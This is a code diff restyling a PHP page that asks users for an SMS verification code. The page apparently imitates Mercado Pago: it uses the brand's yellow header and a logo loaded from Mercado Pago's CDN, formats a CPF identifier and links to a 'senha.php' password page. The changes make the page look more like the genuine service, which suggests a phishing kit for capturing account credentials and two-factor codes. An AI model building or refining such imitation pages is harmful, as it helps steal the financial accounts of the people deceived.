@@ -23,38 +23,50 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     <title>Insira o código SMS</title>
     <style>
         :root {
+            --cor-amarela: #ffe600;
             --cor-azul: #3483fa;
             --cor-texto-primaria: #333;
             --cor-texto-secundaria: #666;
             --cor-borda: #ccc;
-            --cor-fundo: #fff;
+            --cor-fundo: #f5f5f5; /* Fundo cinza claro */
+            --cor-card: #fff;
+            --cor-linha: #e0e0e0;
+        }
+        html {
+            height: 100%;
         }
         body {
             margin: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             background-color: var(--cor-fundo);
             color: var(--cor-texto-primaria);
-        }
-        .mobile-container {
-            padding: 16px 24px;
             display: flex;
             flex-direction: column;
-            text-align: center;
+            min-height: 100%;
         }
-        .header-logo {
-            margin: 24px auto;
-            width: 48px;
-            height: 48px;
+        .main-header {
+            background-color: var(--cor-amarela);
+            padding: 12px 24px;
+            flex-shrink: 0;
+        }
+        .main-header img {
+            height: 30px;
+        }
+        .main-content {
+            background-color: var(--cor-card);
+            padding: 24px;
+            flex-grow: 1; /* Faz o conteúdo principal crescer */
         }
         .user-info-box {
-            display: inline-flex;
+            display: flex; /* Mudado para flex para alinhar à esquerda */
             align-items: center;
             gap: 8px;
-            border: 1px solid #e0e0e0;
+            border: 1px solid var(--cor-linha);
             border-radius: 30px;
             padding: 6px 12px;
-            margin: 0 auto 24px auto;
+            margin-bottom: 32px;
             font-size: 14px;
+            width: fit-content; /* Largura baseada no conteúdo */
         }
         .user-info-box .icon {
             width: 24px;
@@ -81,34 +93,36 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             color: var(--cor-texto-secundaria);
             text-transform: uppercase;
             margin-bottom: 8px;
+            text-align: left;
         }
         .main-title {
             font-size: 24px;
             font-weight: 500;
             margin: 0 0 12px 0;
+            text-align: left;
         }
         .description-text {
             font-size: 16px;
             color: var(--cor-texto-secundaria);
             line-height: 1.5;
-            margin: 0 auto 32px auto;
-            max-width: 300px;
+            margin: 0 0 32px 0;
+            text-align: left;
         }
         .code-inputs {
             display: flex;
             gap: 8px;
-            justify-content: center;
+            justify-content: space-between; /* Espaçamento igual */
             margin: 16px 0;
         }
         .code-inputs input {
-            width: 100%; /* Inputs flexíveis */
+            width: 100%;
             max-width: 45px;
             height: 55px;
             text-align: center;
             font-size: 22px;
             border: 1px solid var(--cor-borda);
             border-radius: 6px;
-            flex-grow: 1; /* Permite que cresçam */
+            flex-grow: 1;
         }
         .code-inputs input:focus {
             border-color: var(--cor-azul);
@@ -148,17 +162,30 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             font-weight: 500;
             margin-top: 24px;
             display: block;
+            text-align: center;
+        }
+        .main-footer {
+            background-color: var(--cor-card);
+            padding: 24px;
+            text-align: center;
+            border-top: 1px solid var(--cor-linha);
+            flex-shrink: 0;
+        }
+        .main-footer a {
+            color: var(--cor-azul);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
         }
     </style>
 </head>
 <body>
 
-    <main class="mobile-container">
-        
-        <div class="header-logo">
-            <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.72/mercadopago/logo__small.png" alt="Logo">
-        </div>
+    <header class="main-header">
+        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
+    </header>
 
+    <main class="main-content">
         <div class="user-info-box">
             <div class="icon">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -185,9 +212,11 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         
         <div class="resend-timer"></div>
         <a href="senha.php" class="footer-link">Escolher outro método</a>
-        <a href="#" class="footer-link">Preciso de ajuda</a>
-
     </main>
+
+    <footer class="main-footer">
+        <a href="#">Preciso de ajuda</a>
+    </footer>
 
     <script>
         const smsForm = document.getElementById('sms-form');
